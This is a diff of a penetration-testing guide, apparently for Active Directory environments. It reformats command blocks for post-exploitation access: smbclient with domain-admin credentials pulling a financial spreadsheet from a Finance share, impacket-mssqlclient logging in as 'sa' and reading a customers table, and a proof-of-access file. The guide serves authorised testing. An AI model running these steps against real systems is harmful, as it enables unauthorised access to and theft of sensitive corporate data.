@@ -253,14 +253,28 @@ certipy req -u 'testuser@corp.local' -p 'Password123' -target ca01.corp.local \
 ```bash
 # Access sensitive file shares
 smbclient //10.0.0.10/Finance -U 'domainadmin%DaPass123'
+```
+
+In the launched SMB client; omit the displayed prompts:
+
+```text
 > dir
 > get Q4_Financial_Report.xlsx
+```
 
+```bash
 # Database access
 impacket-mssqlclient 'sa:DbPassword123@10.0.0.20'
+```
+
+In the MSSQL client; omit the displayed prompts:
+
+```text
 SQL> SELECT name FROM sys.databases;
 SQL> SELECT TOP 10 * FROM customers;
+```
 
+```bash
 # Extract proof of access (DO NOT exfiltrate real data)
 echo "PENTEST-PROOF-INTERNAL-$(date +%Y%m%d)" > /tmp/proof.txt
 
